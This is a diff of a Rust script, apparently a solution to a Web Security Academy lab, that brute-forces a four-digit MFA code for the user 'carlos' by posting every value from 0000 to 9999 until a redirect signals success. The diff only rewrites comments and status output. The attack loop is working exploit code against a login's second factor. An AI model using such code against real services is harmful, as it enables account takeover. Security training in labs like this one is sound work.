@@ -37,36 +37,54 @@ use text_colorizer::Colorize;
 * Main Function
 *******************/
 fn main() {
-    let url = "https://0aa400ea04d8ba59834a1ae6003a003e.web-security-academy.net"; // change this url to your lab
-    let client = build_client(); // This client will be used in every request
-    let session = get_valid_session(&client, url, "wiener", "peter"); // This session will be used to valid our requests to the server
-    println!("{}", "1. Obtaining a valid session ..☑️".white().bold());
-    let pre_post_code_res = fetch_login2(&client, url, "carlos", &session); // Must fetch the /login2 page to make the mfa-code be sent to the mail server
-    println!("{}", "2. GET /login2 page ..☑️".white().bold());
-    let start = time::Instant::now(); // capture the time before brute forcing
+    // change this to your lab URL
+    let url = "https://0aa400ea04d8ba59834a1ae6003a003e.web-security-academy.net";
+
+    // build the client that will be used for all subsequent requests
+    let client = build_client();
+
+    // this session will be used to valid our requests to the server
+    let session = get_valid_session(&client, url, "wiener", "peter");
+
+    println!("{}", "1. Obtaining a valid session ..OK".white().bold());
+
+    // must fetch the /login2 page to make the mfa-code be sent to the mail server
+    let pre_post_code_res = fetch_login2(&client, url, "carlos", &session);
+
+    println!("{}", "2. GET /login2 page ..OK".white().bold());
+
+    // capture the time before brute forcing
+    let start = time::Instant::now();
+
     println!("{}", "3. Start brute forcing mfa-code ..".white().bold());
+
     for code in 0..10000 {
         if let Ok(post_code_res) = post_code(&client, url, "carlos", &session, code) {
             // check if the response is Ok
             match post_code_res.status().as_u16() {
                 302 => {
-                    // Redircet means that the code is correct
+                    // redircet means that the code is correct
                     print!(
                         "\r[*] {} => {}",
                         format!("{code:04}").white().bold(),
                         "Correct".green().bold()
                     );
                     io::stdout().flush();
+
+                    // calculate the elapsed timne
                     let elapased_time = (start.elapsed().as_secs() / 60).to_string();
+
                     println!(
                         "\n{}: {} minutes",
                         "✅ Finished in".green().bold(),
                         elapased_time.white().bold()
                     );
+
+                    // exit from the program
                     process::exit(0);
                 }
                 _ => {
-                    // Code is Incorrect
+                    // code is Incorrect
                     print!(
                         "\r[*] {} => {}",
                         format!("{code:04}").white().bold(),
@@ -76,7 +94,7 @@ fn main() {
                 }
             }
         } else {
-            // Failed to make the post code request
+            // failed to make the post code request
             println!(
                 "\r[*] {} => {}",
                 format!("{:04}", code).white().bold(),
@@ -85,7 +103,9 @@ fn main() {
             io::stdout().flush();
         }
     }
-    println!("Finished in: {:?}", start.elapsed()); // How much time the script take to finish?
+
+    // the time taken by the script to finish
+    println!("Finished in: {:?}", start.elapsed());
 }
 
 /**************************************************************
